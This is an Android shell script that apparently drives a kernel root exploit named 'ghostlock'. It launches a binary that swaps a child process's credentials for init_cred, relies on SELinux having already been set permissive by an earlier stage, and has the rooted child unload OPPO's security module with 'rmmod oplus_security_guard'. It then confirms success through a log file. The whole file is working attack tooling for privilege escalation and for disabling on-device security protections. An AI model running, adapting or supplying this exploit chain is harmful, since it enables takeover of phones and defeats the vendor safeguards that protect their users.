#!/system/bin/sh
# W2: give our own victim child root (cred -> init_cred) and, as the very first
# thing that child does, unload OPPO's guard module.
#
#   GHOSTLOCK_W2_ONLY=1        SELinux is already permissive, so skip the W1 write
#   GHOSTLOCK_RMMOD_GUARD=1    the generated root script starts with
#                                rmmod oplus_security_guard
#                              and logs rc + the remaining /proc/modules entries
#   GHOSTLOCK_HOME / MCAST_SOCKET as for W1.
#
# W1c (rooting adbd) is NOT part of this run: it locates adbd with perf_event_open,
# which needs CAP_SYS_PTRACE for a non-dumpable target, so it can only work after
# this run has produced a process with full capabilities.
#
# Self-verification: once the rooted child starts, it writes
#   /data/local/tmp/gl-w1/rmmod-guard.log   ("[*] rmmod rc=0" + the remaining count)
# and this script prints it and exits.

DIR=/data/local/tmp/gl-w1
LOG="$DIR/w2.log"
GUARDLOG="$DIR/rmmod-guard.log"

cd "$DIR" || exit 1
export GHOSTLOCK_HOME="$DIR"
export GHOSTLOCK_MCAST_SOCKET=tcp6
export GHOSTLOCK_W2_ONLY=1
export GHOSTLOCK_RMMOD_GUARD=1

echo "W2: before: enforce=$(getenforce) guard_entries=$(grep -c oplus_security_guard /proc/modules)"

rm -f "$LOG" "$GUARDLOG"
setsid ./ghostlock --profile "$DIR/profile.bin" >"$LOG" 2>&1 &
PID=$!
echo "W2: started pid=$PID -- log echoed below (also kept in $LOG)"

seen=0
i=0
while [ $i -lt 300 ]; do
    total=$(wc -l < "$LOG" 2>/dev/null)
    [ -z "$total" ] && total=0
    if [ "$total" -gt "$seen" ]; then
        tail -n +$((seen + 1)) "$LOG"
        seen=$total
    fi
    if [ -s "$GUARDLOG" ]; then
        echo "=== $GUARDLOG ==="
        cat "$GUARDLOG"
        echo "W2: guard_entries_now=$(grep -c oplus_security_guard /proc/modules)"
        echo "W2: parked process is pid=$PID; do NOT kill it (a reboot is the clean exit)"
        exit 0
    fi
    if [ "$i" -gt 5 ] && ! kill -0 "$PID" 2>/dev/null; then
        echo "W2: process exited without reaching the rooted child -- last lines:"
        tail -12 "$LOG"
        exit 1
    fi
    sleep 1
    i=$((i + 1))
done

echo "W2: still running after 300s (pid=$PID); see $LOG"
exit 2
